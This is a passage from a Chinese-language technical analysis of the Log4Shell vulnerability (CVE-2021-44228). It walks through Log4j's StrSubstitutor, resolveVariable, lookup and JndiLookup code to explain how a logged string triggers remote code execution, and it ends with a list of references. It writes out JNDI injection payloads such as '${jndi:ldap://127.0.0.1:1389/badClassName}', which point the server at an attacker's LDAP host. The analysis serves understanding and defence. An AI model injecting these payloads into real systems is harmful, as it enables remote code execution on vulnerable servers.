在这里要说一下，触发漏洞的必要条件其实就是此章节最上头写的那些:

```java
Logger logger = LogManager.getLogger();
logger.error("error message: {}",${jndi:rmi://<ip>/<ref>});
```

通常程序员会写下这样的日志代码，去记录一些错误日志，当攻击方输入恶意payload后，将会使变量进行更改，类似 `logger.error("error_message:${jndi:ldap://127.0.0.1:1389/badClassName}");`

而`StrSubstitutor.substitute`的递归将使`jndi:ldap://127.0.0.1:1389/badClassName`进入`resolveVariable` 方法	

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/0118.png)

经过调试确认了关键方法`resolveVariable`

```java
protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
                                 final int startPos, final int endPos) {
    final StrLookup resolver = getVariableResolver();
    if (resolver == null) {
        return null;
    }
    // 进入
    return resolver.lookup(event, variableName);
}
```

接下来进入了最关键的`lookup()`方法:

```java
@Override
public String lookup(final LogEvent event, String var) {
    if (var == null) {
        return null;
    }

    final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
    if (prefixPos >= 0) {
        final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);
        final String name = var.substring(prefixPos + 1);
        // 关键
        final StrLookup lookup = strLookupMap.get(prefix);
        if (lookup instanceof ConfigurationAware) {
            ((ConfigurationAware) lookup).setConfiguration(configuration);
        }
        String value = null;
        if (lookup != null) {
            // 这里的name是：ldap://127.0.0.1:1389/badClassName
            value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);
        }

        if (value != null) {
            return value;
        }
        var = var.substring(prefixPos + 1);
    }
    if (defaultLookup != null) {
        return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var);
    }
    return null;
}
```

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/qLouyja.png)

其中画框重点的 `strLookupMap` 包含以下值(内置方法)：

![img](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/BLyjN15.png)

如果匹配到内置方法，那么就进入对应的处理方法，这里是 JNDI 方法，那么就会由`JndiLookup
`类进一步处理

![image-20220110024513630](../assets/2021-12-12-CVE-2021-44228-Apache%20Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83/image-20220110024513630.png)

最终加载由攻击者传入的LDAP服务端地址，然后返回一个恶意的 `JNDI Reference`对象，触发漏
洞，实现 RCE



### 0x04 **References** 

https://security.tencent.com/index.php/blog/msg/131

https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/

https://xz.aliyun.com/t/10649

https://www.reddit.com/r/blueteamsec/comments/rd38z9/log4j_0day_being_exploited/

https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/

https://www.youtube.com/watch?v=Y8a5nB-vy78
